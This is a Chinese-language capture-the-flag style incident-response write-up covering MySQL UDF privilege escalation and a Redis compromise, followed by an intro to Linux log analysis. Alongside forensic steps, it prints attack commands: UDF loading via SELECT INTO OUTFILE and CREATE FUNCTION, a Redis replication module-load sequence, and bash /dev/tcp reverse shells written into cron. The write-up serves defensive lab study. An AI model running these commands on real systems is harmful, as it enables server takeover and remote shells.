secure_file_priv           | /var/lib/mysql-files/  |\n+----------------------------+------------------------+\n```\n\n这种的话进行分析就是\n\n**require_secure_transport: OFF**\n\n这个设置决定是 MySQL 是否要求使用安全传输层（如 SSL/TLS）来保护客户端与服务器之间的通信。\n\n**secure_auth: ON**\n\n这个选项决定是否启用基于安全身份验证的 MySQL 客户端连接\n\n**secure_file_priv: /var/lib/mysql-files/**\n\n这个设置指定 MySQL 服务器可以执行文件操作（如 LOAD DATA INFILE 和 SELECT INTO OUTFILE）的目录。\n/var/lib/mysql-files/ 指定了一个受限的文件路径，简单来说就是 MySQL 只能从这个目录中加载文件或将数据导出到该目录，防止服务器访问不必要的文件路径，确实是提高了安全性。\n\n但是我们这secure_file_priv为空可能就是mysql没有对文件操作进行相应的限制，这会导致黑客可以利用UDF提权，因为他们可以任意的进行文件操作\n\n我们来了解一下什么是UDF提权\n\n#### **什么是 UDF 提权？**\n\nUDF 提权是利用 MySQL 的用户定义函数进行权限提升的攻击方法。攻击者可以编写恶意的 UDF 插件，并将其加载到 MySQL 中，从而执行系统级别的命令。\n\n使用过 MySQL 的人都知道，MySQL 有很多内置函数提供给使用者，包括字符串函数、数值函数、日期和时间函数等，给开发人员和使用者带来了很多方便。MySQL 的内置函数虽然丰富，但毕竟不能满足所有人的需要，有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候，就需要对 MySQL 进行一些扩展，幸运的是，**MySQL 给使用者提供了添加新函数的机制，这种使用者自行添加的 MySQL 函数就称为 UDF (User Define Function)。**\n\n#### UDF 提权有哪些条件\n\n- 获取 mysql 控制权限：知道 mysql 用户名和密码，并且可以远程登录（即获取了 mysql 数据库的权限）\n- mysql 具有写入文件的权限：mysql 有写入文件的权限，即 secure_file_priv 的值为空\n\n#### 什么情况下需要 UDF 提权\n\n- 拿到了 mysql 的权限，但是没拿到 mysql 所在服务器的任何权限，通过 mysql 提权，将 mysql 权限提升到操作系统权限\n\n所以到这里我们就可以确定黑客是利用UDF进行提权攻击的了，那么接下来我们该想想，如果是UDF提权的话，那么黑客会在哪里留下痕迹呢?\n\n- 在进行 UDF (User Defined Function) 提权时，攻击者通常会将恶意共享库文件放在 MySQL 插件目录中。这个目录的默认路径通常是 /usr/lib/mysql/plugin/，/usr/lib/mysql/plugin/ 目录是MySQL用来存放用户定义函数(UDF, User Defined Function)动态链接库文件的地方。一**个名为udf.so的文件出现在此目录下，表明有人安装了一个自定义函数到MySQL服务器中。**（一般来说就是这个目录，没人闲着会去移动）\n\n\n那为什么攻击者会使用 /usr/lib/mysql/plugin/ 目录？\n\n默认插件目录：\n\n/usr/lib/mysql/plugin/ 是 MySQL 的默认插件目录，MySQL 有权限加载和执行该目录中的共享库文件。\n\n- 加载插件的需求：\n\n插件必须放置在 MySQL 的插件目录中，才能被 MySQL 识别和加载。攻击者通过将恶意 .so 文件放入该目录，实现提权。\n\n- 权限管理：\n\n由于 MySQL 服务运行时需要访问插件目录，通常该目录的权限设置相对宽松，允许 MySQL 服务有读写权限。\n所以我们直接进入目录\n\n![image-20241117214451735](./../image/achieve/202411/玄机第二章日志分析/image-20241117214451735.png)\n\n这里可以看到有udf.so文件，所以黑客确实是通过UDF提权的\n\n直接把目录md5加密后提交flag就可以了\n\n扩展一下典型的UDF提权攻击\n\n#### 典型的 UDF 提权攻击步骤：\n\n- 编写恶意 UDF 插件：攻击者编写一个 .so 文件，该文件包含恶意代码。\n\n\n- 上传恶意插件：利用 MySQL 的文件操作功能将该文件上传到服务器上的某个路径。\n\n\nSELECT '' INTO OUTFILE '/path/to/your/udf.so';\n\n- 创建 UDF 函数：使用 CREATE FUNCTION 命令将这个共享库文件加载为 MySQL 的 UDF 函数。\n\n\nCREATE FUNCTION do_system RETURNS INTEGER SONAME 'udf.so';\n\n- 执行命令：调用这个 UDF 函数执行系统命令。\n\n\nSELECT do_system('id');\n\n#### 检查和防护UDF\n\n- 检查 UDF 函数：查看是否存在异常的 UDF 函数。\n\n\nSELECT * FROM mysql.func;\n\n- 限制 secure_file_priv：将 secure_file_priv 设置为一个特定的路径，限制 MySQL 文件操作的范围。\n\n\nsecure_file_priv = /var/lib/mysql-files\n\n- 移除不需要的 UDF 函数：删除所有可疑的 UDF 函数。\n\n\nDROP FUNCTION IF EXISTS do_system;\n\n- 权限控制：严格控制数据库用户的权限，避免赋予不必要的权限，特别是文件操作和创建函数的权限。\n\n\n- 日志监控：定期检查 MySQL 日志文件，关注异常的文件操作和函数创建活动。\n\n\n### 问题4:.黑客获取的权限\n\n既然黑客已经获得了权限，那他肯定会在库中写下一些自定义函数，我们直接去库里面找一下新增的函数就可以了\n\n可以先查看一下进程\n\n![image-20241117215044255](./../image/achieve/202411/玄机第二章日志分析/image-20241117215044255.png)\n\n这里可以看到mysql服务是正在进行的，**使用了指定的配置目录、数据目录和插件目录，发现目录就是UDF使用提取的目录，暂时也不是很确认，我们可以进入数据库进行分析进一步确认；**\n\n#### UDF 提权的典型痕迹\n\n- 异常的 .so 文件：（上面也有提到）\n\n\n检查这些目录下是否有最近创建的 .so 文件，特别是名字看起来可疑或不符合系统文件命名规范的文件。\n\n- MySQL 日志：\n\n检查 MySQL 日志文件（如 mysql.log 或 error.log）中是否有异常的文件操作记录或 CREATE FUNCTION 语句。\n\n- MySQL 函数表：\n\n检查 mysql.func 表中是否有异常的 UDF 函数。\nSELECT * FROM mysql.func;\n我们进入数据库，并使用命令\n\n```\nSELECT * FROM mysql.func;\n```\n\n这里可以检查**`mysql.func` 表中是否有异常的 UDF 函数，同样这个表会查询到新增函数**\n\n![image-20241117215455720](./../image/achieve/202411/玄机第二章日志分析/image-20241117215455720.png)\n\n这里可以看到有一个sys_eval函数，**所以sys_eval就是黑客新增的函数，接着题目让我们提交whoami后的值所以这里我们直接查询即可**\n\n```\nselect sys_eval('whoami');\n```\n\n![image-20241117215539631](./../image/achieve/202411/玄机第二章日志分析/image-20241117215539631.png)\n\n- **`whoami` 命令**：（题目要求）\n  - `whoami` 是一个 Unix/Linux 命令，用于返回当前执行命令的用户名称。\n  - 在 MySQL 中调用 `sys_eval('whoami')` 实际上是让 MySQL 服务器在操作系统上执行 `whoami` 命令，并返回结果。\n  - 当 MySQL 执行 `select sys_eval('whoami');` 时，它调用 `UDF sys_eval`，传入参数 whoami。\n  - sys_eval 函数执行 whoami 命令，并捕获其输出。\n  - MySQL 返回 whoami 命令的输出，即运行 MySQL 服务器进程的用户名称。\n\n## 第二章日志分析-redis应急响应\n\n### **什么是redis**\n\n**Redis 是一个开源的、内存中的数据结构存储系统，用作数据库、缓存和消息代理。它支持多种数据结构，如字符串、散列、列表、集合、有序集合、位图、HyperLogLogs 和地理空间索引半径查询**\n\n### 关于Redis的攻击手法有\n\n- 未授权访问：\n\n\n缺乏身份验证：默认情况下，Redis 不要求身份验证，攻击者可以直接连接到 Redis 实例并执行任意命令。\n\n开放的网络接口：如果 Redis 监听在一个公共的 IP 地址上，攻击者可以通过网络远程访问 Redis 实例。\n\n- 远程代码执行：\n\nCONFIG 命令：攻击者可以利用未授权访问，通过 CONFIG 命令修改配置，例如设置 dir 和 dbfilename 来写入恶意文件，从而在目标服务器上执行代码。\n\n模块加载：Redis 允许加载自定义模块，如果没有进行适当的访问控制，攻击者可以加载恶意模块并执行任意代码。\n\n- 持久化攻击：\n\n持久化文件劫持：攻击者可以修改 Redis 的持久化配置（如 RDB 或 AOF 文件），然后写入恶意数据，当 Redis 重启时执行恶意操作。\n\n恶意数据注入：通过注入恶意数据到持久化文件中，攻击者可以在数据恢复时触发恶意行为。\n\n- 拒绝服务攻击（DoS）：\n\n资源耗尽：通过发送大量请求或存储大量数据，攻击者可以耗尽 Redis 服务器的内存或 CPU 资源，导致服务不可用。\n\n大键值操作：操作超大键值（如大列表或集合）可能会导致 Redis 性能下降，甚至崩溃。\n\n- 数据篡改和泄露：\n\n数据窃取：未经授权的访问可以导致敏感数据的泄露。\n数据篡改：攻击者可以修改或删除关键数据，影响系统的正常运行。\n\n### Redis 的一些关键特性和用途：\n\n关键特性：\n\n- 高性能：\n\n\n由于 Redis 是内存数据库，数据存储和读取的速度非常快。每秒可以执行数百万次操作。\n\n- 多种数据结构：\n\nRedis 支持多种数据结构，使其非常灵活，能够适应不同类型的应用场景。\n\n支持的结构包括：字符串（Strings）、列表（Lists）、集合（Sets）、有序集合（Sorted Sets）、哈希（Hashes）、位图（Bitmaps）等。\n\n- 持久化：\n\n虽然 Redis 是内存数据库，但它支持将数据持久化到磁盘上，以防数据丢失。\n\n两种持久化方式：RDB（快照）和 AOF（追加文件）。\n\n- 复制（Replication）：\n\nRedis 支持主从复制，可以将数据从一个 Redis 服务器复制到多个从服务器，提供数据冗余和高可用性。\n\n- 高可用性：\n\nRedis 通过 Redis Sentinel 提供高可用性。Sentinel 监控 Redis 主从实例，并在主服务器不可用时自动进行故障转移。\n\n- 集群（Cluster）：\n\nRedis Cluster 提供自动分片和高可用性，允许 Redis 数据分布在多个节点上。\n\n- 事务：\n\n支持事务，可以保证一组命令的原子性。\n\n- 脚本：\n\nRedis 支持 Lua 脚本，使得可以在 Redis 服务器端执行复杂的逻辑。\n\n### 基本的常见用途：\n\n- 缓存：\n\n\n由于 Redis 的高性能，常被用作缓存来存储频繁访问的数据，减少数据库负载和提高应用响应速度。\n\n- 会话存储：\n\nRedis 可以用来存储用户会话数据，如网站的用户登录会话等。\n\n- 消息队列：\n\nRedis 支持发布/订阅、列表和有序集合，因此可以用作简单的消息队列系统。\n\n- 实时分析：\n\nRedis 可以用于实时数据分析和统计，如计数器、唯一用户统计等。\n\n- 排行榜/计分板：\n\n由于有序集合的支持，Redis 非常适合实现排行榜和计分板功能。\n\n- 地理空间数据：\n\nRedis 提供了内置的地理空间数据类型和命令，可以处理和查询地理位置数据。\nRedis 的强大功能和灵活性使其在现代应用中得到了广泛的应用，包括社交网络、实时分析、缓存、会话管理和队列处理等领域。\n\n### 问题1：通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少\n\nRedis服务器日志存放位置:\n\n```\n/var/log/redis/redis.log\n```\n\n**Redis 日志文件通常用于记录 Redis 服务器的运行情况、错误信息和其他重要事件。这些日志文件默认存放在 `/var/log/` 目录下，但实际位置可以通过 Redis 配置文件 `redis.conf` 中的 `logfile` 参数进行配置**\n\n我们先查询一下redis版本号\n\n```\nredis-cli INFO | grep redis_version\n```\n\n![image-20241118200210465](./../image/achieve/202411/玄机第二章日志分析/image-20241118200210465.png)\n\n当然我们在日志中也是可以看到版本号的\n\n![image-20241118200318025](./../image/achieve/202411/玄机第二章日志分析/image-20241118200318025.png)\n\n对于 Redis 5.0.1，未授权访问 是最常见且可能性最大的漏洞，尤其是在 Redis 默认配置下没有设置密码的情况下。攻击者可以通过未授权访问执行以下操作：\n\n读取和修改数据：攻击者可以读取 Redis 数据库中的所有数据，甚至可以删除或修改数据。\n远程代码执行：攻击者可以利用 CONFIG 命令修改配置文件来写入恶意代码，从而在目标服务器上执行任意代码。\n持久化恶意代码：通过修改 Redis 的持久化配置，攻击者可以在服务器重启时执行恶意操作。\n\n接下来我们分析日志\n\ncat一下日志，发现日志内容并不算很多，我们可以慢慢看一下，会发现一个ip192.168.100.13出现了很多次\n\n![image-20241118200445702](./../image/achieve/202411/玄机第二章日志分析/image-20241118200445702.png)\n\n关键日志信息：\n\n- MASTER <-> REPLICA sync started: 表示 Redis 副本（REPLICA）尝试与主服务器（MASTER）进行同步。\n\n- Error condition on socket for SYNC: Connection refused: 表示同步连接尝试失败，连接被拒绝。\n\n所以这里可以看到这个ip在频繁的与服务器同步连接，但是都连接失败，说明这个ip在进行爆破，不过这个不是我们问题的ip\n\n我们继续分析\n\n我这里的话自己检索了一下ip\n\n```\ncat redis.log | grep 192.168\n```\n\n![image-20241118201335200](./../image/achieve/202411/玄机第二章日志分析/image-20241118201335200.png)\n\n这里可以看到有三个ip，我就返回去逐个分析了\n\n![image-20241118201112284](./../image/achieve/202411/玄机第二章日志分析/image-20241118201112284.png)\n\n这里可以看到192.168.100.20的\n\n```\n419:S 31 Jul 2023 05:34:33.786 * Connecting to MASTER 192.168.100.20:8888\n419:S 31 Jul 2023 05:34:33.786 * MASTER <-> REPLICA sync started\n419:S 31 Jul 2023 05:34:33.788 * Non blocking connect for SYNC fired the event.\n419:S 31 Jul 2023 05:34:35.192 * Master replied to PING, replication can continue...\n419:S 31 Jul 2023 05:34:35.194 * Trying a partial resynchronization (request 7a73a1a4297a16c50d8465b0cc432444f0e5df71:1).\n419:S 31 Jul 2023 05:34:35.195 * Full resync from master: ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ:1\n419:S 31 Jul 2023 05:34:35.195 * Discarding previously cached master state.\n419:S 31 Jul 2023 05:34:35.195 * MASTER <-> REPLICA sync: receiving 48040 bytes from master\n419:S 31 Jul 2023 05:34:35.197 * MASTER <-> REPLICA sync: Flushing old data\n419:S 31 Jul 2023 05:34:35.197 * MASTER <-> REPLICA sync: Loading DB in memory\n419:S 31 Jul 2023 05:34:35.197 # Wrong signature trying to load DB from file\n419:S 31 Jul 2023 05:34:35.197 # Failed trying to load the MASTER synchronization DB from disk\n```\n\n**从这部分日志中，可以看到与192.168.100.20成功建立连接并进行同步。尽管尝试加载同步数据时出现错误，但连接和同步过程已经开始，这意味着攻击者已经能够通过这种连接尝试植入恶意代码或进一步操控系统。**\n\n加载恶意模块：\n\n```\n419:S 31 Jul 2023 05:34:37.205 * Module 'system' loaded from ./exp.so\n```\n\n最后，从日志中可以看到恶意模块exp.so被成功加载，这通常是黑客用来执行进一步攻击的手段。\n\n搬来了大佬的图片解析\n\n![img](https://i-blog.csdnimg.cn/blog_migrate/c1c44daa65c04b31fcaedea8562ff80a.png)\n\n这里可以看到有建立主从复制的ID加载exp.so文件模块并进行持久化保存，所以我们猜测是使用了redis主从复制攻击，而且exp.so也经常用于主从复制攻击\n\n#### redis主从复制攻击\n\nRedis的主从复制是用来实现数据冗余和提高可用性的一种机制。\n\n1、从节点发送同步请求：从节点通过发送SYNC或PSYNC命令请求与主节点同步数据。\n\n2、全量同步：如果从节点是首次同步或与主节点的复制偏移量不匹配，主节点会执行BGSAVE命令创建一个RDB文件，并将其发送给从节点。从节点接收RDB文件并加载到内存中。\n\n3、增量同步：在全量同步之后，主节点会将其缓冲区中的写命令持续发送给从节点，以保证数据一致性。\n我们用靶机打一下试试\n\n```\n#连接靶机本地redis\n打开终端并输入命令 redis-cli\n#设置文件路径为/tmp/\nconfig set dir /tmp/ \n#设置数据库文件名为：exp.so\nconfig set dbfilename exp.so \n#设置主redis地址为 vpsip，端口为 port\nslaveof vpsip port \nmodule load /tmp/exp.so\nsystem.exec 'bash -i >& /dev/tcp/ip/port 0>&1'\n```\n\n![image-20241118203906432](./../image/achieve/202411/玄机第二章日志分析/image-20241118203906432.png)\n\n然后我们查看一下日志\n\n![image-20241118203939311](./../image/achieve/202411/玄机第二章日志分析/image-20241118203939311.png)\n\n这里可以看到我们的exp2.so已经被记录到日志中，ip也是对的上的，所以这个exp.so一定就是黑客上传的恶意文件了\n\n### 问题2:通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件\n\n因为我们上面进行了一次攻击操作，也知道了这个exp.so就是我们想要找的恶意文件，但我们还是学习一下常规的人工排查方法去做这道题\n\n题目让我们找到黑客第一次上传的恶意文件，一般来说我们都会先去翻翻日志，看看有什么可疑的活动，接着筛选可疑命令，搜索如 CONFIG SET、SLAVEOF、MODULE LOAD 等命令，这些命令可能被黑客用来修改 Redis 的配置或者加载恶意模块。\n\n```\nsudo grep ‘CONFIG SET’ /var/log/redis.log\nsudo grep ‘SLAVEOF’ /var/log/redis.log\nsudo grep ‘MODULE LOAD’ /var/log/redis.log\nsudo grep ‘config set’ /var/log/redis.log\nsudo grep ‘slaveof’ /var/log/redis.log\nsudo grep ‘module load’ /var/log/redis.log\n```\n\n![image-20241118205110969](./../image/achieve/202411/玄机第二章日志分析/image-20241118205110969.png)\n\n简单分析一下；\n\n根据日志，攻击者在多次执行 `SLAVEOF` 命令后，通过修改 Redis 的主从复制配置，将受害者的 Redis 实例配置为从属服务器，从而将恶意数据或命令同步到目标服务器。\n\n具体分析；\n\n- 05:33:15 - REPLICAOF 192.168.100.13:8888：\n\n\n攻击者首次执行 SLAVEOF 命令，将 Redis 配置为从属服务器，指向 192.168.100.13:8888。\n\n攻击者可能尝试与其控制的服务器建立连接，以同步数据。\n\n- 05:34:03 - REPLICAOF 192.168.31.55:8888：\n\n第二次执行 SLAVEOF 命令，将从属服务器的地址更改为 192.168.31.55:8888。\n\n这可能是因为与 192.168.100.13:8888 的连接失败，攻击者更换了控制服务器地址。\n\n- 05:34:33 - REPLICAOF 192.168.100.20:8888：\n\n第三次执行 SLAVEOF 命令，将从属服务器的地址再次更改为 192.168.100.20:8888。\n\n这可能是攻击者的第三个尝试，试图找到一个能够成功连接的控制服务器。\n\n- 05:34:37 - MASTER MODE enabled：\n\n最终攻击者将 Redis 配置为主服务器模式，说明他们已经成功掌控了 Redis 实例。\n这一点通常是在成功与恶意服务器同步后，攻击者控制 Redis 实例所进行的操作。\n我们在分析 Redis 日志的过程中，尽管能够识别出攻击者的行为（如多次尝试使用 SLAVEOF 命令），我们仍需要找到黑客上传的具体恶意文件。通常，黑客上传的文件可能包括恶意的 Redis 模块、恶意脚本等，这些文件会在 Redis 的数据目录或临时目录中生成。\n所以这里我们还需要进一步检查 Redis 日志中提到的模块；\n\n```\ngrep \"Module 'system' loaded from\" /var/log/redis/redis.log\n```\n\n运行结果\n\n```\n419:S 31 Jul 2023 05:34:37.205 * Module ‘system’ loaded from ./exp.so\n```\n\n我们再返回去看日志(直接搬的大佬的，懒得截图了)\n\n![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/fbfe99f0d7aefe424eb6171737f42161.png#pic_center)\n\n1. **多次的`SLAVEOF` 命令**：\n   - 攻击者首先将 Redis 配置为从属服务器指向 `192.168.31.55:8888`，然后又指向 `192.168.100.20:8888`。这可能是为了多次尝试连接攻击者的控制服务器。\n2. **模块卸载**：\n   - 在 `05:34:37.231` 时，模块被卸载。这可能是攻击者在执行完恶意操作后卸载模块以掩盖痕迹。\n3. **多次保存数据库**：\n   - 数据库在 `05:42:00` 和 `05:42:42` 时被保存到磁盘。这可能表明攻击者试图将恶意数据持久化。\n4. **加载恶意模块**：\n   - 日志显示在 `05:34:37.205` 时加载了名为 `system` 的模块（从 `./exp.so` 路径）。这很可能是一个恶意模块。\n\n那问题又来了\n\n#### 为什么 SLAVEOF 算作恶意行为？\n\n利用漏洞：通过 SLAVEOF 命令，攻击者可以让目标 Redis 实例连接到他们控制的主服务器，从而将恶意数据同步到目标服务器上。\n模块加载：在同步过程中，攻击者可以利用模块加载功能，将恶意模块（如 exp.so）加载到目标服务器上，从而执行任意代码或篡改数据。\n\n#### 那我们应该如何找到恶意文件呢?\n\nsudo find -name exp.so\n\n不过我们可以发现，我们上面的命令都是需要管理员权限才能执行的，不然的话是找不到命令的\n\n### 问题3:通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少\n\n想要知道怎么找到反弹shell，我们得先了解一下redis未授权攻击反弹shell\n\n攻击手法\n\n```\nredis-cli -h 192.168.100.13 #连接\n \nredis flushall #清除所有键值\n \nconfig set dir /var/spool/cron/crontabs/ #设置保存路径\n \nconfig set dbfilename shell #保存名称\n \nset xz “\\n * bash -i >& /dev/tcp/192.168.100.13/7777 0>&1\\n” #将反弹shell写入xz键值\n \nsave #写入保存路径的shell文件\n```\n\n我们先看一下开放端口\n\n```\nnetstat -lanpt\n```\n\n![image-20241118211547724](./../image/achieve/202411/玄机第二章日志分析/image-20241118211547724.png)\n\n发现并没有什么端口是web的，判断黑客不是通过写入 webshell 反弹的 shell\n\n那我们看一下定时任务\n\n```\ncrontab -l\n```\n\n![image-20241118211127370](./../image/achieve/202411/玄机第二章日志分析/image-20241118211127370.png)\n\n```\n/bin/sh -i >& /dev/tcp/192.168.100.13/7777 0>&1\n```\n\n这段命令是一种用于创建反向Shell连接的技术\n\n分析一下\n\n- `/bin/sh -i`: 启动一个交互式Shell。\n- `>&`: 重定向标准输出和标准错误输出。\n- `/dev/tcp/192.168.100.13/7777`: 通过TCP连接到IP地址`192.168.100.13`的端口`7777`。在一些Unix-like系统中，`/dev/tcp/host/port`是一种特殊的文件描述符，通过它可以实现网络连接。\n- `0>&1`: 将标准输入重定向到标准输出。\n\n所以直接把这个ip交了就可以了\n\n### 问题4:通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串\n\n这个的话就相对简单了，就是分析ssh登录情况\n\n通常 SSH 登录的日志记录在系统的安全日志文件中，但是，SSH（Secure Shell）提供了两种主要的登录验证方式；\n\n1. 密码验证（Password Authentication）\n\n工作原理：\n\n用户在登录时需要提供用户名和密码。\n服务器接收用户名和密码后，验证它们是否匹配预先存储的凭证。\n如果用户名和密码正确，用户即可登录服务器。\n2. 公钥验证（Public Key Authentication）\n\n工作原理：\n\n用户生成一对 SSH 密钥对，包括私钥和公钥。\n公钥被上传并存储在目标服务器的用户账户下的 ~/.ssh/authorized_keys 文件中。\n用户在登录时使用其私钥进行身份验证。\n服务器通过匹配用户提供的私钥和存储的公钥来验证用户身份。\n如果匹配成功，用户即可登录服务器。所以我们可以从两点看出；\n\n- Redis 配置：黑客利用 Redis 的未授权访问或其他漏洞，将自己的公钥写入了服务器的 ~/.ssh/authorized_keys 文件中，从而可以使用 SSH 公钥验证进行登录。\n\n- 登录日志：SSH 登录日志通常会显示使用的验证方式。虽然在提供的日志中没有明确显示公钥验证，但结合 Redis 被利用的情况，可以推测黑客可能通过这种方式获取了访问权限。\n\n所以我们的主机上往往都会写入ssh密钥，那我们先查一下ssh文件\n\n```\n///查看目录有没有ssh文件\nls -la\n//进入ssh文件\ncd .ssh\n//查看公钥文件\ncat authorized_keys\n```\n\n![image-20241118212348752](./../image/achieve/202411/玄机第二章日志分析/image-20241118212348752.png)\n\n最后可以看到用户名是xj -test-user\n\n搜一下\n\n![image-20241118212539097](./../image/achieve/202411/玄机第二章日志分析/image-20241118212539097.png)\n\n然后我搜寻了好半天才找到flag\n\n![image-20241118213038940](./../image/achieve/202411/玄机第二章日志分析/image-20241118213038940.png)\n\n### 问题5:通过本地 PC SSH到服务器并且分析黑客篡改的命令\n\n这个的话工程量就比较大了\n\n我们一步步来吧\n\n1. **先看命令历史**\n\n   ```\n   history\n   ```\n\n   没什么收获\n\n2. **检查系统路径中的命令**\n\n   ```\n   cd /usr/bin\n   ls -la\n   ```\n\n   ![image-20241118213713443](./../image/achieve/202411/玄机第二章日志分析/image-20241118213713443.png)\n\n发现了一个特别的命令，rwxrwxrwx权限，意思是这个命令具有读取，写入和执行权限，并且对所有用户都开放\n\n我们看一下这个ps命令\n\n```\ncat ps\n```\n\n![image-20241118213847088](./../image/achieve/202411/玄机第二章日志分析/image-20241118213847088.png)\n\n脚本解析：\n\n#!/bin/bash 表示这是一个 Bash 脚本，用来执行后续的命令。\n\n- 变量设置：\n\noldifs=\"$IFS\"：保存旧的字段分隔符（IFS）值。\nIFS='\\$n'：设置新的字段分隔符为\\$n（这里可能是一个笔误，正常应该是换行符\\n，但写法上看起来可能是在尝试定义一个特殊分隔符）。\n\n- 命令执行和处理：\n\nresult=$(ps_ $1 $2 $3|grep -v 'threadd' )：执行 ps_ 命令，并使用 grep 命令过滤掉包含’threadd’的行，将结果存储在 result 变量中。\n\nfor v in $result;：对 $result 中的每个变量 v 进行循环处理。\n\necho -e \"$v\\t\";：输出每个变量 v，并在末尾添加一个制表符。\n\n- 恢复原始设置：\n\nIFS=\"$oldifs\"：恢复原始的字段分隔符设置。\n\n分析总结：\n\n这段脚本似乎是为了获取 ps_ 命令的输出，并按行处理和输出结果。ps_ 命令的具体功能和输出内容在这里并未详细说明，但可以我们可以推测这是一个对系统进程进行查询和处理的脚本。\n\n把注释内容进行提交就可以了\n","tags":["玄机第二章日志分析"],"categories":["玄机"]},{"title":"玄机第一章应急响应(二刷已完)","url":"/2025/04/21/玄机第一章应急响应(已做完)/","content":"\n# 0x01前言\n\n在刷ctfshow的空闲时间里做一些玄机的安全日志和应急响应方面的题目，也算是更偏向于实践中的一些防守措施吧,不过第一章都是借鉴着师傅的wp进行实践学习的\n\n[玄机——第一章 应急响应-Linux日志分析 wp_玄机linux日志分析-CSDN博客](https://blog.csdn.net/administratorlws/article/details/139560740?ops_request_misc=%7B%22request%5Fid%22%3A%22b99b24403d7f7572af4ea5e29fd9f779%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=b99b24403d7f7572af4ea5e29fd9f779&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-139560740-null-null.nonecase&utm_term=第一章&spm=1018.2226.3001.4450)\n\n[玄机——第一章 应急响应- Linux入侵排查 wp_玄机应急-CSDN博客](https://blog.csdn.net/administratorlws/article/details/139577643?ops_request_misc=%7B%22request%5Fid%22%3A%22b99b24403d7f7572af4ea5e29fd9f779%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=b99b24403d7f7572af4ea5e29fd9f779&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-139577643-null-null.nonecase&utm_term=第一章&spm=1018.2226.3001.4450)\n\n[玄机——第一章 应急响应-webshell查杀 wp（手把手保姆级教学）-CSDN博客](https://blog.csdn.net/administratorlws/article/details/139521078?ops_request_misc=%7B%22request%5Fid%22%3A%22b99b24403d7f7572af4ea5e29fd9f779%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=b99b24403d7f7572af4ea5e29fd9f779&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-139521078-null-null.nonecase&utm_term=第一章&spm=1018.2226.3001.4450)\n\n# 0x02正文\n\n### 第一章 应急响应-Linux日志分析\n\n#### 什么是Linux日志分析\n\nLinux日志分析是指对Linux系统中生成的日志文件进行检查、监控和分析的过程。在Linux系统中，各种服务和应用程序会产生日志文件，记录系统运行状态、用户操作、系统错误、安全事件等信息。分析这些日志可以帮助系统管理员理解系统的运行状况，诊断问题，并确保系统的安全和稳定运行。日志分析可以手动进行，也可以使用各种日志分析工具来自动化这一过程。常见的日志文件包括系统日志（/var/log/syslog 或 /var/log/messages）、认证日志（/var/log/auth.log）、应用程序日志等。\n\n#### 常见日志文件\n\nLinux系统中的日志文件通常存储在 /var/log 目录下，常见的日志文件包括：\n\n| 日志文件             | 文件说明                                                     |\n| -------------------- | ------------------------------------------------------------ |\n| **/var/log/cron**    | 记录了系统定时任务相关的日志。                               |\n| /var/log/cups        | 记录打印信息的日志。                                         |\n| **/var/log/dmesg**   | 记录了系统在开机时内核自检的信息，也可以使用 dmesg 命令直接查看内核自检信息。 |\n| /var/log/mailog      | 记录邮件信息。                                               |\n| **/var/log/message** | 记录系统重要信息的日志。这个日志文件中会记录 Linux 系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件。 |\n| /var/log/btmp        | 记录错误登录日志，这个文件是二进制文件，不能直接 vim 查看，而要使用 `lastb` 命令查看。 |\n| /var/log/lastlog     | 记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接 vim ，而要使用 `lastlog` 命令查看。 |\n| /var/log/wtmp        | 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接 vim ，而需要使用 `last` 命令来查看。 |\n| /var/run/utmp        | 记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接 vim ，而要使用 `w` ， `who` ， `users`等命令来查询。 |\n| **/var/log/secure**  | 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如 SSH 登录，su 切换用户，sudo 授权，甚至添加用户和修改用户密码都会记录在这个日志文件中。 |\n\n#### 常用命令\n\n`grep` 、 `sed` 、 `awk` 、 `find` 、`netstat` 等\n\n查找文件中的关键字\n\n```\ngrep [选项] \"搜索模式\" [文件或目录]\n```\n\ngrep常见选项\n\n| `-i`           | 忽略大小写（如 `grep -i \"error\" file.txt`）。                |\n| -------------- | ------------------------------------------------------------ |\n| `-v`           | **反向匹配**，显示**不包含**模式的行（如 `grep -v \"success\" file.txt`）。 |\n| `-n`           | 显示匹配行的行号（如 `grep -n \"warning\" file.txt`）。        |\n| `-c`           | 统计匹配行的数量（如 `grep -c \"404\" access.log`）。          |\n| `-r` 或 `-R`   | 递归搜索目录下的所有文件（如 `grep -r \"main\" /src/`）。      |\n| `-l`           | 仅显示包含匹配项的文件名（如 `grep -l \"TODO\" *.py`）。       |\n| `-w`           | 全词匹配（如 `grep -w \"root\" auth.log` 不匹配 `rooted`）。   |\n| `-A NUM`       | 显示匹配行及其后**NUM行**（如 `grep -A 3 \"panic\" syslog`）。 |\n| `-B NUM`       | 显示匹配行及其前**NUM行**（如 `grep -B 2 \"error\" app.log`）。 |\n| `-C NUM`       | 显示匹配行及其前后各**NUM行**（上下文）。                    |\n| `-e`           | 指定多个模式（如 `grep -e \"error\" -e \"fail\" file.txt`）。    |\n| `-E`           | 启用扩展正则表达式（等同于 `egrep`）。                       |\n| `-F`           | 按字面字符串匹配（禁用正则表达式，速度快）。                 |\n| `--color=auto` | 高亮显示匹配内容（默认已启用）。                             |\n| -a             | 选项表示将文件内容视为文本文件                               |\n\n#### 